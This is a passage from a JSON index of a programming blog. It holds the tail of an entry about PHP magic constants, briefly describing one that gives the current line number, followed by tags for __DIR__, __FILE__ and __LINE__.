：代表当前这个常量所在的行号","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"__DIR__","slug":"DIR","permalink":"https://xiaowuyoucy.github.io/tags/DIR/"},{"name":"__FILE__","slug":"FILE","permalink":"https://xiaowuyoucy.github.io/tags/FILE/"},{"name":"__LINE__","slug":"LINE","permalink":"https://xiaowuyoucy.github.io/tags/LINE/"}]}]}